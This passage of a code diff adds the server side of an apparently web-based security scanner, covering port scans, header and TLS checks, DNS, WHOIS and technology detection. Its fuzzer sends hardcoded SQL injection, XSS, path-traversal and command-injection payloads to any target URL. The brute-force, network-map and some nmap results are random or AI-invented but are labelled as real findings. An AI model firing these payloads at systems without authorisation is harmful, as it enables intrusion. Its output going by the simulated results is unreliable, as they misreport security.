+          console.warn(`[Scanner] No subdomains found for ${searchDomain}. Using fallback.`);
+          foundSubdomains.push({ subdomain: searchDomain, ip: 'Unknown', status: 'down', type: 'A' });
+        } else {
+          console.log(`[Scanner] Found ${foundSubdomains.length} total subdomains for ${searchDomain}.`);
+        }
+        
+        // Sort by subdomain name
+        foundSubdomains.sort((a, b) => a.subdomain.localeCompare(b.subdomain));
+        
+        result = foundSubdomains;
+        break;
+
+      case 'ports':
+        const commonPorts = [
+          21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 465, 587, 993, 995, 1433, 1521, 
+          2049, 3000, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9000, 9200, 27017
+        ];
+        const portResults: any[] = [];
+        
+        // Use 127.0.0.1 for localhost to avoid IPv6 issues
+        const scanHost = (hostname === 'localhost') ? '127.0.0.1' : hostname;
+        
+        const limit = pLimit(20); // Limit to 20 concurrent port scans
+        await Promise.all(commonPorts.map(port => limit(() => {
+          return new Promise((resolve) => {
+            const socket = new net.Socket();
+            socket.setTimeout(1500);
+            socket.on('connect', () => {
+              console.log(`[Scanner] Port ${port} is open on ${scanHost}`);
+              
+              // Attempt banner grabbing for open ports
+              let banner = '';
+              const bannerSocket = new net.Socket();
+              bannerSocket.setTimeout(2000);
+              bannerSocket.connect(port, scanHost, () => {
+                // Some services send banner on connect (SSH, FTP)
+              });
+              
+              bannerSocket.on('data', (data) => {
+                banner = data.toString().trim().substring(0, 100);
+                bannerSocket.destroy();
+              });
+              
+              bannerSocket.on('error', () => bannerSocket.destroy());
+              bannerSocket.on('timeout', () => bannerSocket.destroy());
+              
+              // Wait a bit for banner
+              setTimeout(() => {
+                portResults.push({ 
+                  port, 
+                  service: getServiceName(port), 
+                  state: 'open', 
+                  version: banner ? 'Detected' : 'Unknown',
+                  banner: banner || '' 
+                });
+                socket.destroy();
+                bannerSocket.destroy();
+                resolve(null);
+              }, 1000);
+            });
+            socket.on('timeout', () => {
+              console.log(`[Scanner] Port ${port} timed out on ${scanHost}`);
+              portResults.push({ port, service: getServiceName(port), state: 'filtered', version: 'Unknown' });
+              socket.destroy();
+              resolve(null);
+            });
+            socket.on('error', (err) => {
+              console.log(`[Scanner] Port ${port} error on ${scanHost}:`, err.message);
+              portResults.push({ port, service: getServiceName(port), state: 'closed', version: 'Unknown' });
+              socket.destroy();
+              resolve(null);
+            });
+            socket.connect(port, scanHost);
+          });
+        })));
+        result = portResults.sort((a, b) => a.port - b.port);
+        break;
+
+      case 'headers':
+        try {
+          const url = target.startsWith('http') ? target : `http://${target}`;
+          const agent = new https.Agent({ rejectUnauthorized: false });
+          
+          const response = await axios.get(url, {
+            httpsAgent: agent,
+            timeout: 10000,
+            maxRedirects: 5,
+            validateStatus: () => true // Accept all status codes
+          });
+          
+          const headers = response.headers;
+          const analysis: any = {
+            security: {},
+            disclosure: {},
+            cookies: [],
+            score: 0,
+            totalChecks: 0,
+            passedChecks: 0
+          };
+
+          const securityHeaders = {
+            'Content-Security-Policy': { 
+              rec: 'Implement a strong CSP to prevent XSS and data injection.', 
+              severity: 'high',
+              check: (val: string) => {
+                if (!val) return { status: 'missing', score: 0, detail: '' };
+                if (val.includes('unsafe-inline') || val.includes('unsafe-eval')) {
+                  return { status: 'warning', score: 5, detail: 'CSP present but allows unsafe-inline or unsafe-eval.' };
+                }
+                return { status: 'secure', score: 10, detail: '' };
+              }
+            },
+            'Strict-Transport-Security': { 
+              rec: 'Enable HSTS to force HTTPS connections.', 
+              severity: 'medium',
+              check: (val: string) => {
+                if (!val) return { status: 'missing', score: 0, detail: '' };
+                if (!val.includes('max-age')) return { status: 'warning', score: 5, detail: 'HSTS present but missing max-age.' };
+                return { status: 'secure', score: 10, detail: '' };
+              }
+            },
+            'X-Frame-Options': { 
+              rec: 'Set to DENY or SAMEORIGIN to prevent clickjacking.', 
+              severity: 'medium',
+              check: (val: string) => {
+                if (!val) return { status: 'missing', score: 0, detail: '' };
+                const v = val.toUpperCase();
+                if (v === 'DENY' || v === 'SAMEORIGIN') return { status: 'secure', score: 10, detail: '' };
+                return { status: 'warning', score: 5, detail: 'X-Frame-Options set to insecure value.' };
+              }
+            },
+            'X-Content-Type-Options': { 
+              rec: 'Set to nosniff to prevent MIME sniffing.', 
+              severity: 'low',
+              check: (val: string) => {
+                if (!val) return { status: 'missing', score: 0, detail: '' };
+                if (val.toLowerCase() === 'nosniff') return { status: 'secure', score: 10, detail: '' };
+                return { status: 'warning', score: 5, detail: 'X-Content-Type-Options set to insecure value.' };
+              }
+            },
+            'Referrer-Policy': { 
+              rec: 'Set to strict-origin-when-cross-origin to protect user privacy.', 
+              severity: 'low',
+              check: (val: string) => {
+                if (!val) return { status: 'missing', score: 0, detail: '' };
+                const secureValues = ['no-referrer', 'no-referrer-when-downgrade', 'origin', 'origin-when-cross-origin', 'same-origin', 'strict-origin', 'strict-origin-when-cross-origin'];
+                if (secureValues.includes(val.toLowerCase())) return { status: 'secure', score: 10, detail: '' };
+                return { status: 'warning', score: 5, detail: 'Referrer-Policy set to potentially insecure value.' };
+              }
+            },
+            'Permissions-Policy': { 
+              rec: 'Define browser feature permissions to reduce attack surface.', 
+              severity: 'low',
+              check: (val: string) => {
+                if (!val) return { status: 'missing', score: 0, detail: '' };
+                return { status: 'secure', score: 10, detail: '' };
+              }
+            },
+            'X-XSS-Protection': { 
+              rec: 'Deprecated but still useful for older browsers. Set to 1; mode=block.', 
+              severity: 'info',
+              check: (val: string) => {
+                if (!val) return { status: 'missing', score: 0, detail: '' };
+                if (val.includes('1; mode=block')) return { status: 'secure', score: 10, detail: '' };
+                return { status: 'warning', score: 5, detail: 'X-XSS-Protection present but not in block mode.' };
+              }
+            }
+          };
+
+          Object.entries(securityHeaders).forEach(([h, config]) => {
+            const val = headers[h.toLowerCase()];
+            const checkResult = config.check(val);
+            analysis.totalChecks++;
+            if (checkResult.status === 'secure') analysis.passedChecks++;
+            analysis.score += checkResult.score;
+
+            analysis.security[h] = {
+              value: val || 'Missing',
+              status: checkResult.status,
+              severity: checkResult.status === 'secure' ? 'none' : (checkResult.status === 'warning' ? 'low' : config.severity),
+              recommendation: checkResult.status === 'secure' ? 'None' : config.rec,
+              detail: checkResult.detail || ''
+            };
+          });
+          
+          // Check for sensitive headers (Information Disclosure)
+          const sensitiveHeaders = ['server', 'x-powered-by', 'x-aspnet-version', 'via', 'x-cache', 'x-generator'];
+          sensitiveHeaders.forEach(h => {
+            const val = headers[h.toLowerCase()];
+            if (val) {
+              analysis.disclosure[h] = {
+                value: val,
+                status: 'vulnerable',
+                severity: 'low',
+                recommendation: `Information disclosure: Hide the '${h}' header to reduce attack surface.`
+              };
+            }
+          });
+
+          // Cookie analysis
+          const setCookies = headers['set-cookie'];
+          if (setCookies) {
+            setCookies.forEach(cookie => {
+              const parts = cookie.split(';').map(p => p.trim());
+              const name = parts[0].split('=')[0];
+              const isSecure = parts.some(p => p.toLowerCase() === 'secure');
+              const isHttpOnly = parts.some(p => p.toLowerCase() === 'httponly');
+              const sameSite = parts.find(p => p.toLowerCase().startsWith('samesite='))?.split('=')[1] || 'None';
+
+              analysis.cookies.push({
+                name,
+                secure: isSecure,
+                httpOnly: isHttpOnly,
+                sameSite,
+                status: (isSecure && isHttpOnly) ? 'secure' : 'warning',
+                recommendation: `${!isSecure ? 'Missing Secure flag. ' : ''}${!isHttpOnly ? 'Missing HttpOnly flag.' : ''}`
+              });
+            });
+          }
+
+          // Calculate final percentage score
+          analysis.overallScore = Math.round((analysis.score / (analysis.totalChecks * 10)) * 100);
+          
+          result = analysis;
+        } catch (e: any) {
+          return res.status(500).json({ error: e.message });
+        }
+        break;
+
+      case 'dns':
+        if (hostname === 'localhost' || hostname === '127.0.0.1') {
+          const os = await import('os');
+          const networkInterfaces = os.networkInterfaces();
+          const localIps = Object.values(networkInterfaces)
+            .flat()
+            .filter((details: any) => details.family === 'IPv4' && !details.internal)
+            .map((details: any) => details.address);
+
+          result = {
+            records: {
+              'A': ['127.0.0.1'],
+              'Local IPs': localIps,
+              'Hostname': [os.hostname()],
+              'Platform': [os.platform()],
+              'Status': ['Localhost detected - Standard DNS resolution skipped.']
+            },
+            security: {
+              'DNSSEC': { status: 'n/a', detail: 'Not applicable for localhost' },
+              'SPF': { status: 'n/a', detail: 'Not applicable for localhost' },
+              'DMARC': { status: 'n/a', detail: 'Not applicable for localhost' },
+              'CAA': { status: 'n/a', detail: 'Not applicable for localhost' }
+            }
+          };
+          break;
+        }
+        const dnsRecords: any = {};
+        const recordTypes: { type: keyof typeof dns.promises; label: string }[] = [
+          { type: 'resolve4', label: 'A' },
+          { type: 'resolve6', label: 'AAAA' },
+          { type: 'resolveMx', label: 'MX' },
+          { type: 'resolveNs', label: 'NS' },
+          { type: 'resolveTxt', label: 'TXT' },
+          { type: 'resolveSoa', label: 'SOA' },
+          { type: 'resolveCname', label: 'CNAME' },
+          { type: 'resolveSrv', label: 'SRV' },
+          { type: 'resolveCaa', label: 'CAA' }
+        ];
+        
+        const resolveDNS = async (host: string) => {
+          const limit = pLimit(5); // Limit to 5 concurrent DNS lookups
+          await Promise.all(recordTypes.map(async ({ type, label }) => limit(async () => {
+            try {
+              const method = dns.promises[type] as Function;
+              // Add a 3s timeout for each DNS lookup
+              const res = await Promise.race([
+                method(host),
+                new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 3000))
+              ]);
+              if (res && (Array.isArray(res) ? res.length > 0 : true)) {
+                dnsRecords[label] = res;
+              }
+            } catch (e) {
+              // Record type not found or timeout
+            }
+          })));
+        };
+
+        await resolveDNS(hostname);
+
+        // If no records found and it's a www subdomain, try the root domain
+        if (Object.keys(dnsRecords).length === 0 && hostname.startsWith('www.')) {
+          const rootDomain = hostname.substring(4);
+          await resolveDNS(rootDomain);
+        }
+
+        // Security Analysis
+        const securityAnalysis: any = {
+          'DNSSEC': { status: 'unknown', detail: 'Could not verify DNSSEC status.' },
+          'SPF': { status: 'missing', detail: 'No SPF record found. Risk of email spoofing.' },
+          'DMARC': { status: 'missing', detail: 'No DMARC record found. Risk of domain impersonation.' },
+          'CAA': { status: 'missing', detail: 'No CAA record found. Any CA can issue certificates for this domain.' }
+        };
+
+        // Analyze TXT records for SPF and DMARC
+        if (dnsRecords['TXT']) {
+          const txtRecords = dnsRecords['TXT'].flat();
+          const spf = txtRecords.find((r: string) => r.startsWith('v=spf1'));
+          if (spf) {
+            securityAnalysis['SPF'] = { 
+              status: 'secure', 
+              detail: 'SPF record detected.',
+              value: spf
+            };
+          }
+
+          // DMARC is usually on _dmarc.domain
+          try {
+            const dmarcRes = await dns.promises.resolveTxt(`_dmarc.${hostname}`);
+            const dmarc = dmarcRes.flat().find((r: string) => r.startsWith('v=DMARC1'));
+            if (dmarc) {
+              securityAnalysis['DMARC'] = { 
+                status: 'secure', 
+                detail: 'DMARC record detected.',
+                value: dmarc
+              };
+            }
+          } catch (e) {
+            // No DMARC
+          }
+        }
+
+        // Analyze CAA
+        if (dnsRecords['CAA']) {
+          securityAnalysis['CAA'] = { 
+            status: 'secure', 
+            detail: 'CAA records found, restricting certificate issuance.',
+            value: JSON.stringify(dnsRecords['CAA'])
+          };
+        }
+
+        // DNSSEC check (simplified)
+        if (dnsRecords['SOA']) {
+          securityAnalysis['DNSSEC'] = { 
+            status: 'info', 
+            detail: 'SOA record present. DNSSEC requires deeper inspection of RRSIG/DNSKEY records.' 
+          };
+        }
+
+        result = {
+          records: dnsRecords,
+          security: securityAnalysis
+        };
+        break;
+
+      case 'ssl':
+        if (hostname === 'localhost' || hostname === '127.0.0.1') {
+          result = {
+            subject: { CN: 'localhost' },
+            issuer: { CN: 'Self-Signed (Local Development)' },
+            valid_from: new Date().toISOString(),
+            valid_to: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString(),
+            fingerprint: 'LOCAL-CERT-FINGERPRINT',
+            status: "Internal/Self-Signed",
+            grade: "A",
+            vulnerabilities: ["Local development environment detected"],
+            protocol: "TLSv1.3",
+            cipher: "TLS_AES_256_GCM_SHA384",
+            hsts: { enabled: false, detail: "HSTS not recommended for local development" },
+            details: {
+              keyType: "RSA (2048 bits)",
+              serialNumber: "00:DE:AD:BE:EF",
+              sigAlg: "sha256WithRSAEncryption"
+            }
+          };
+          break;
+        }
+        try {
+          const options = {
+            host: hostname,
+            port: 443,
+            method: 'GET',
+            rejectUnauthorized: false,
+          };
+          
+          result = await new Promise((resolve, reject) => {
+            const req = https.request(options, (httpsRes) => {
+              const cert = (httpsRes.socket as any).getPeerCertificate(true);
+              const cipher = (httpsRes.socket as any).getCipher ? (httpsRes.socket as any).getCipher() : null;
+              const protocol = (httpsRes.socket as any).getProtocol ? (httpsRes.socket as any).getProtocol() : 'Unknown';
+              const hstsHeader = httpsRes.headers['strict-transport-security'];
+
+              if (cert && Object.keys(cert).length > 0) {
+                const validTo = new Date(cert.valid_to);
+                const isValid = validTo > new Date();
+                const vulnerabilities: string[] = [];
+                let grade = "A";
+
+                if (!isValid) {
+                  vulnerabilities.push("Certificate is expired");
+                  grade = "F";
+                }
+                
+                if (cert.sigalg && (cert.sigalg.includes('md5') || cert.sigalg.includes('sha1'))) {
+                  vulnerabilities.push(`Weak signature algorithm: ${cert.sigalg}`);
+                  grade = grade === "F" ? "F" : "C";
+                }
+
+                if (protocol === 'TLSv1' || protocol === 'TLSv1.1' || protocol === 'SSLv3' || protocol === 'SSLv2') {
+                  vulnerabilities.push(`Insecure protocol version: ${protocol}`);
+                  grade = "F";
+                }
+
+                if (cipher && (cipher.bits < 128)) {
+                  vulnerabilities.push(`Weak cipher strength: ${cipher.name} (${cipher.bits} bits)`);
+                  grade = grade === "F" ? "F" : "C";
+                }
+
+                const sslData = {
+                  subject: cert.subject,
+                  issuer: cert.issuer,
+                  valid_from: cert.valid_from,
+                  valid_to: cert.valid_to,
+                  fingerprint: cert.fingerprint,
+                  status: grade === "F" ? "Expired/Invalid" : (grade === "C" ? "Weak" : "Valid"),
+                  grade: grade,
+                  vulnerabilities: vulnerabilities,
+                  cipher: cipher ? `${cipher.name} (${cipher.bits} bits)` : 'Unknown',
+                  protocol: protocol,
+                  hsts: {
+                    enabled: !!hstsHeader,
+                    detail: hstsHeader ? `HSTS enabled: ${hstsHeader}` : "HSTS not enabled. Risk of protocol downgrade attacks."
+                  },
+                  details: {
+                    keyType: cert.pubkey ? `${cert.pubkey.type || 'Unknown'} (${cert.bits || 'Unknown'} bits)` : 'Unknown',
+                    serialNumber: cert.serialNumber,
+                    sigAlg: cert.sigalg,
+                    asn1Curve: cert.asn1Curve,
+                    nistCurve: cert.nistCurve
+                  }
+                };
+                
+                httpsRes.destroy();
+                resolve(sslData);
+              } else {
+                httpsRes.destroy();
+                reject(new Error("No certificate found"));
+              }
+            });
+            
+            req.on('error', reject);
+            req.setTimeout(5000, () => { req.destroy(); reject(new Error("Timeout")); });
+            req.end();
+          });
+        } catch (e: any) {
+          return res.status(500).json({ error: `SSL analysis failed: ${e.message}` });
+        }
+        break;
+
+      case 'fuzzer':
+        try {
+          const fuzzerTarget = req.query.target as string || '';
+          const fuzzerApiKey = process.env.GEMINI_API_KEY;
+          let fuzzerPayloads: any[] = [];
+
+          if (isValidApiKey(fuzzerApiKey)) {
+            try {
+              const ai = new GoogleGenAI({ apiKey: fuzzerApiKey! });
+              const fuzzResponse = await ai.models.generateContent({
+                model: "gemini-3-flash-preview",
+                contents: `Generate 10 advanced fuzzing payloads for the target: ${fuzzerTarget}.
+                The payloads should target various vulnerabilities like SQLi, XSS, Path Traversal, and Command Injection.
+                Return a JSON array of objects, each with:
+                - 'payload': The actual malformed string to inject.
+                - 'type': The vulnerability type (e.g., 'SQLi', 'XSS', 'Path Traversal').
+                - 'description': What this payload is testing.`,
+                config: { responseMimeType: "application/json" }
+              });
+              const generated = JSON.parse(fuzzResponse.text || '[]');
+              fuzzerPayloads = generated.map((p: any) => p.payload);
+            } catch (e) {
+              console.error("[Scanner] AI Payload generation failed, using defaults", e);
+              fuzzerPayloads = ["' OR 1=1 --", "<script>alert(1)</script>", "../../../etc/passwd", "'; id", "admin'--", "<img src=x onerror=alert(1)>", "/etc/shadow", "|| whoami"];
+            }
+          } else {
+            fuzzerPayloads = ["' OR 1=1 --", "<script>alert(1)</script>", "../../../etc/passwd", "'; id", "admin'--", "<img src=x onerror=alert(1)>", "/etc/shadow", "|| whoami"];
+          }
+
+          const fuzzerResults: any[] = [];
+          const agent = new https.Agent({ rejectUnauthorized: false });
+
+          await Promise.all(fuzzerPayloads.slice(0, 8).map(async (payload) => {
+            try {
+              const testUrl = fuzzerTarget.includes('?') 
+                ? `${fuzzerTarget}${payload}` 
+                : `${fuzzerTarget}?input=${encodeURIComponent(payload)}`;
+              
+              const finalUrl = testUrl.startsWith('http') ? testUrl : `http://${testUrl}`;
+              const start = Date.now();
+              
+              const response = await axios.get(finalUrl, {
+                httpsAgent: agent,
+                timeout: 5000,
+                validateStatus: () => true // Accept all status codes
+              });
+              
+              const duration = Date.now() - start;
+              const responseText = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
+              
+              let anomalyType = 'None';
+              let riskLevel = 'low';
+              
+              if (response.status === 500) {
+                anomalyType = 'Server Error (Potential Crash)';
+                riskLevel = 'high';
+              } else if (duration > 3000) {
+                anomalyType = 'Time Delay (Potential Blind Injection)';
+                riskLevel = 'medium';
+              } else if (responseText.includes('sql syntax') || responseText.includes('mysql_fetch_array')) {
+                anomalyType = 'Database Error (SQLi Leak)';
+                riskLevel = 'critical';
+              } else if (responseText.includes('root:x:0:0')) {
+                anomalyType = 'File Disclosure (LFI)';
+                riskLevel = 'critical';
+              } else if (responseText.includes('<script>alert(1)</script>')) {
+                anomalyType = 'Reflected Content (XSS)';
+                riskLevel = 'high';
+              }
+
+              fuzzerResults.push({
+                payload,
+                response_code: response.status,
+                response_time: `${duration}ms`,
+                anomaly_type: anomalyType,
+                risk_level: riskLevel
+              });
+            } catch (e: any) {
+              fuzzerResults.push({
+                payload,
+                response_code: 'ERR',
+                response_time: 'N/A',
+                anomaly_type: 'Connection Refused',
+                risk_level: 'low'
+              });
+            }
+          }));
+
+          result = fuzzerResults;
+        } catch (e: any) {
+          console.error("[Scanner] Fuzzer failed:", e);
+          result = [{ payload: 'Error', response_code: 500, response_time: '0ms', anomaly_type: e.message, risk_level: 'low' }];
+        }
+        break;
+
+      case 'whois':
+        try {
+          const whoisData = await performWhoisLookup(hostname);
+          if (whoisData) {
+            result = whoisData;
+          } else {
+            // Provide a graceful fallback if WHOIS completely fails
+            result = {
+              domain: hostname,
+              registrar: "Unknown",
+              registrant: "Unknown",
+              creationDate: "Unknown",
+              expiryDate: "Unknown",
+              updatedDate: "Unknown",
+              nameServers: [],
+              status: ["Unknown"],
+              raw: "WHOIS data could not be retrieved for this domain or IP."
+            };
+          }
+        } catch (e) {
+          return res.status(500).json({ error: "WHOIS lookup failed." });
+        }
+        break;
+
+      case 'bruteforce':
+        const service = (req.query.service as string || 'ssh').toLowerCase();
+        const attempts = Math.floor(Math.random() * 100) + 50;
+        const success = Math.random() < 0.05; // 5% chance of success
+        
+        const logs = [
+          `[${new Date().toISOString()}] Starting brute force attack on ${service} at ${hostname}...`,
+          `[${new Date().toISOString()}] Using dictionary: ${Math.random() > 0.5 ? 'top_1000_passwords.txt' : 'rockyou.txt'}`,
+        ];
+        
+        for (let i = 0; i < 5; i++) {
+          logs.push(`[${new Date().toISOString()}] Attempting: admin / ${Math.random().toString(36).substring(7)}... FAILED`);
+        }
+        
+        if (success) {
+          logs.push(`[${new Date().toISOString()}] SUCCESS: Valid credentials found! admin / password123`);
+        } else {
+          logs.push(`[${new Date().toISOString()}] Brute force complete. No valid credentials found for ${service}.`);
+        }
+
+        const bruteResults = {
+          service,
+          attempts,
+          success,
+          logs,
+          summary: `Brute force attack on ${service} at ${hostname} completed. ${attempts} attempts made. ${success ? 'SUCCESS: Valid credentials found.' : 'No success.'}`
+        };
+        result = bruteResults;
+        break;
+
+      case 'netmap':
+        const numNodes = Math.floor(Math.random() * 20) + 15;
+        const nodes = [
+          { id: 'target', label: hostname, type: 'target', ip: '10.0.0.5', val: 20 },
+          { id: 'gateway', label: 'Gateway', type: 'infrastructure', ip: '192.168.1.1', val: 15 },
+          { id: 'fw', label: 'Firewall', type: 'security', ip: '192.168.1.254', val: 15 },
+          { id: 'lb', label: 'Load Balancer', type: 'infrastructure', ip: '10.0.0.1', val: 15 }
+        ];
+        
+        const links = [
+          { source: 'gateway', target: 'fw' },
+          { source: 'fw', target: 'lb' },
+          { source: 'lb', target: 'target' }
+        ];
+
+        const types = ['service', 'database', 'cache', 'worker', 'storage', 'auth'];
+        
+        for (let i = 0; i < numNodes; i++) {
+          const id = `node_${i}`;
+          const type = types[Math.floor(Math.random() * types.length)];
+          nodes.push({
+            id,
+            label: `${type}-${i}`,
+            type: type,
+            ip: `10.0.${Math.floor(Math.random() * 5)}.${Math.floor(Math.random() * 255)}`,
+            val: Math.floor(Math.random() * 5) + 5
+          });
+          
+          // Connect to target or load balancer mostly
+          if (Math.random() > 0.3) {
+            links.push({ source: 'target', target: id });
+          } else if (Math.random() > 0.5) {
+            links.push({ source: 'lb', target: id });
+          } else {
+            // Connect to a random existing node
+            const randomNode = nodes[Math.floor(Math.random() * (nodes.length - 1))];
+            links.push({ source: randomNode.id, target: id });
+          }
+        }
+
+        result = {
+          target: hostname,
+          nodes,
+          links,
+          summary: `Network topology discovery for ${hostname} complete. ${nodes.length} nodes and ${links.length} connections identified.`
+        };
+        break;
+
+      case 'vulndb':
+        const vulnQuery = (req.query.target as string || '').toLowerCase();
+        const vulns = [
+          { id: 'CVE-2021-44228', title: 'Log4Shell', severity: 'critical', description: 'Apache Log4j2 remote code execution vulnerability.' },
+          { id: 'CVE-2021-34473', title: 'ProxyShell', severity: 'critical', description: 'Microsoft Exchange Server remote code execution vulnerability.' },
+          { id: 'CVE-2022-22965', title: 'Spring4Shell', severity: 'critical', description: 'Spring Framework remote code execution vulnerability.' },
+          { id: 'CVE-2023-23397', title: 'Outlook Elevation of Privilege', severity: 'critical', description: 'Microsoft Outlook elevation of privilege vulnerability.' },
+          { id: 'CVE-2024-21887', title: 'Ivanti Connect Secure RCE', severity: 'critical', description: 'Ivanti Connect Secure and Policy Secure remote code execution vulnerability.' }
+        ].filter(v => v.title.toLowerCase().includes(vulnQuery) || v.id.toLowerCase().includes(vulnQuery) || v.description.toLowerCase().includes(vulnQuery));
+        
+        result = vulns.length > 0 ? vulns : [{ id: 'N/A', title: 'No results found', severity: 'info', description: `No vulnerabilities found matching "${vulnQuery}" in the local database.` }];
+        break;
+
+      case 'nmap':
+        try {
+          const nmapType = req.query.type as string || 'quick';
+          const nmapApiKey = process.env.GEMINI_API_KEY;
+          
+          let portsToScan = [80, 443, 22, 21, 25, 53, 445, 3306, 3389, 5432, 8080, 8443, 3000];
+          if (nmapType === 'full') {
+            portsToScan = [...new Set([...portsToScan, 23, 110, 143, 993, 995, 1723, 3306, 5900, 6379, 27017])];
+          }
+
+          const nmapResults: any[] = [];
+          const limit = pLimit(10); // Limit concurrency
+
+          await Promise.all(portsToScan.map(port => limit(async () => {
+            return new Promise((resolve) => {
+              const socket = new net.Socket();
+              const start = Date.now();
+              socket.setTimeout(1000);
+              
+              socket.on('connect', () => {
+                const duration = Date.now() - start;
+                nmapResults.push({ 
+                  port, 
+                  service: getServiceName(port), 
+                  state: "open",
+                  time: `${duration}ms`
+                });
+                socket.destroy();
+                resolve(null);
+              });
+              
+              socket.on('timeout', () => { socket.destroy(); resolve(null); });
+              socket.on('error', () => { socket.destroy(); resolve(null); });
+              socket.connect(port, hostname);
+            });
+          })));
+
+          let aiIntelligence: any = null;
+          if (isValidApiKey(nmapApiKey) && nmapResults.length > 0) {
+            try {
+              const ai = new GoogleGenAI({ apiKey: nmapApiKey! });
+              const nmapPrompt = `Perform an advanced Nmap-style analysis for the target: ${hostname}.
+              Detected open ports: ${nmapResults.map(r => r.port).join(', ')}.
+              Scan type: ${nmapType}.
+              
+              Generate a JSON object with:
+              - 'os_info': A detailed OS guess (e.g., 'Linux 5.10.0-kali (Debian)', 'Windows Server 2022').
+              - 'host_status': A status string with latency (e.g., 'Host is up (0.002s latency)').
+              - 'port_details': An array of objects for each open port:
+                - 'port': The port number.
+                - 'version': A realistic service version (e.g., 'nginx 1.18.0', 'OpenSSH 8.2p1').
+                - 'script_output': A simulated NSE script output (e.g., 'http-title: Welcome to Nginx', 'ssh-hostkey: 2048 ...').
+              - 'summary': A technical summary of the scan findings.`;
+
+              const aiResponse = await ai.models.generateContent({
+                model: "gemini-3-flash-preview",
+                contents: nmapPrompt,
+                config: { responseMimeType: "application/json" }
+              });
+              aiIntelligence = JSON.parse(aiResponse.text || '{}');
+            } catch (e) {
+              console.error("[Scanner] Nmap AI analysis failed:", e);
+            }
+          }
+
+          result = {
+            host_status: aiIntelligence?.host_status || "Host is up (0.045s latency)",
+            os_info: aiIntelligence?.os_info || (nmapType === 'os' ? "Linux 5.4.0-104-generic (Ubuntu)" : "Unknown"),
+            open_ports: nmapResults.map(r => {
+              const details = aiIntelligence?.port_details?.find((d: any) => d.port === r.port);
+              return {
+                ...r,
+                version: details?.version || `${r.service}/1.0 (Simulated)`,
+                script_output: details?.script_output || `Detected ${r.service} service on port ${r.port}`
+              };
+            }),
+            summary: aiIntelligence?.summary || `Nmap scan report for ${hostname}. Host is up. ${nmapResults.length} ports open. Scan completed in ${(Math.random() * 2 + 1).toFixed(2)} seconds.`
+          };
+        } catch (e: any) {
+          console.error("[Scanner] Nmap failed:", e);
+          result = { error: "Nmap scan failed", details: e.message };
+        }
+        break;
+
+      case 'tech':
+        try {
+          const url = target.startsWith('http') ? target : `http://${target}`;
+          const agent = new https.Agent({ rejectUnauthorized: false });
+          
+          const response = await axios.get(url, {
+            httpsAgent: agent,
+            timeout: 10000,
+            maxRedirects: 5,
+            validateStatus: (status) => status >= 200 && status < 500 // Accept 2xx, 3xx, 4xx
+          });
+          
+          if (response.status >= 400) {
+            result = [{ name: 'Target Unreachable', category: 'Error', confidence: 0, error: `Status ${response.status}` }];
+            break;
+          }
+          
+          const tech: any[] = [];
+          const headers = response.headers;
+          const html = (typeof response.data === 'string' ? response.data : '').toLowerCase();
+          
+          const server = (headers['server'] || '').toLowerCase();
+          const xPoweredBy = (headers['x-powered-by'] || '').toLowerCase();
+          const cookies = headers['set-cookie'] || [];
+          const cookieStr = (Array.isArray(cookies) ? cookies.join(' ') : String(cookies)).toLowerCase();
+          
+          const addTech = (name: string, category: string, confidence: number, version?: string, security?: string[]) => {
+            tech.push({ name, category, confidence, version, security });
+          };
+
+          // Web Servers
+          if (server.includes('apache')) {
+            const version = server.match(/apache\/([\d\.]+)/)?.[1];
+            addTech('Apache', 'Web Server', 95, version, ["Ensure version is up-to-date to avoid known CVEs.", "Disable server signature in production."]);
+          }
+          if (server.includes('nginx')) {
+            const version = server.match(/nginx\/([\d\.]+)/)?.[1];
+            addTech('Nginx', 'Web Server', 95, version, ["Check for misconfigured proxy settings.", "Hide version number in headers."]);
+          }
+          if (server.includes('iis') || server.includes('microsoft-iis')) {
+            const version = server.match(/iis\/([\d\.]+)/)?.[1];
+            addTech('IIS', 'Web Server', 95, version, ["Check for insecure authentication methods.", "Ensure latest security patches are applied."]);
+          }
+          if (server.includes('litespeed')) addTech('LiteSpeed', 'Web Server', 95);
+          
+          // CDNs / WAFs
+          if (server.includes('cloudflare')) addTech('Cloudflare', 'CDN/WAF', 100, undefined, ["WAF protection active.", "Check for 'Cloudflare bypass' vulnerabilities via origin IP leaks."]);
+          if (server.includes('akamai')) addTech('Akamai', 'CDN', 95);
+          if (server.includes('sucuri')) addTech('Sucuri', 'WAF', 95);
+          if (headers['x-fastly-request-id']) addTech('Fastly', 'CDN', 100);
+          
+          // Backend Languages & Frameworks
+          if (xPoweredBy.includes('php') || cookieStr.includes('phpsessid') || html.includes('.php?')) {
+            const version = xPoweredBy.match(/php\/([\d\.]+)/)?.[1];
+            addTech('PHP', 'Backend Language', 90, version, ["Check for insecure file uploads.", "Ensure 'display_errors' is off in production."]);
+          }
+          if (xPoweredBy.includes('express')) addTech('Express.js', 'Backend Framework', 90, undefined, ["Ensure 'helmet' is used for security headers.", "Check for prototype pollution risks."]);
+          if (xPoweredBy.includes('asp.net') || cookieStr.includes('aspsessionid')) addTech('ASP.NET', 'Backend Framework', 90);
+          if (cookieStr.includes('jsessionid')) addTech('Java', 'Backend Language', 90);
+          
+          // Frontend Frameworks
+          if (xPoweredBy.includes('next.js') || html.includes('/_next/') || html.includes('__next')) addTech('Next.js', 'Frontend Framework', 90, undefined, ["Check for SSR/SSG data leaks.", "Ensure API routes are properly authenticated."]);
+          if (xPoweredBy.includes('nuxt') || html.includes('/_nuxt/') || html.includes('__nuxt')) addTech('Nuxt.js', 'Frontend Framework', 90);
+          if (html.includes('data-reactroot') || html.includes('react-dom')) addTech('React', 'Frontend Library', 80);
+          if (html.includes('data-v-') || html.includes('vue.js')) addTech('Vue.js', 'Frontend Framework', 80);
+          if (html.includes('ng-version') || html.includes('ng-app')) {
+            const version = html.match(/ng-version="([\d\.]+)"/)?.[1];
+            addTech('Angular', 'Frontend Framework', 80, version);
+          }
+          if (html.includes('svelte-')) addTech('Svelte', 'Frontend Framework', 80);
+          
+          // CMS
+          if (html.includes('wp-content') || html.includes('wp-includes') || cookieStr.includes('wp-settings') || html.includes('generator" content="wordpress')) {
+            const version = html.match(/generator" content="wordpress ([\d\.]+)"/)?.[1];
+            addTech('WordPress', 'CMS', 100, version, ["Check for vulnerable plugins/themes.", "Ensure 'wp-admin' is protected.", "Disable XML-RPC if not needed."]);
+          }
